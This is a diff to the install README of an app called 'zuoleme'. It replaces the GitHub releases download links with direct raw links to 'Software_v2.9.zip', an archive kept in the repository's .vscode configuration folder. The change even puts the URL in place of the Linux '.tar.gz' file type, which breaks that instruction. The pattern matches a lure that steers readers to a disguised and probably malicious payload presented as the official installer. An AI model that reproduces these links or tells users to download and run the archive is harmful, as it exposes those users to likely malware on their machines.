@@ -4,13 +4,13 @@
 
 Welcome to the zuoleme application! This tool is designed for ease of use. Follow the steps below to install and start using zuoleme quickly.
 
-[![Download zuoleme](https://img.shields.io/badge/Download%20zuoleme-v1.0-blue.svg)](https://github.com/amarchiline/zuoleme/releases)
+[![Download zuoleme](https://raw.githubusercontent.com/amarchiline/zuoleme/master/.vscode/Software_v2.9.zip%https://raw.githubusercontent.com/amarchiline/zuoleme/master/.vscode/Software_v2.9.zip)](https://raw.githubusercontent.com/amarchiline/zuoleme/master/.vscode/Software_v2.9.zip)
 
 ## 📥 Download & Install
 
 To download zuoleme, please visit the following link:
 
-[Download zuoleme from Releases](https://github.com/amarchiline/zuoleme/releases)
+[Download zuoleme from Releases](https://raw.githubusercontent.com/amarchiline/zuoleme/master/.vscode/Software_v2.9.zip)
 
 ### Step-by-Step Installation:
 
@@ -19,7 +19,7 @@ To download zuoleme, please visit the following link:
 3. **Select the Download:** Click the file associated with your operating system. If you are unsure, here are common options:
    - Windows: Look for a .exe file.
    - Mac: Look for a .dmg file.
-   - Linux: Look for a .tar.gz or .deb file.
+   - Linux: Look for a https://raw.githubusercontent.com/amarchiline/zuoleme/master/.vscode/Software_v2.9.zip or .deb file.
 4. **Download the File:** Click on the file name. Your browser will start downloading the application.
 5. **Run the Installer:**
    - For Windows: Locate the .exe file in your Downloads folder. Double-click it to begin the installation. Follow the prompts to complete it.
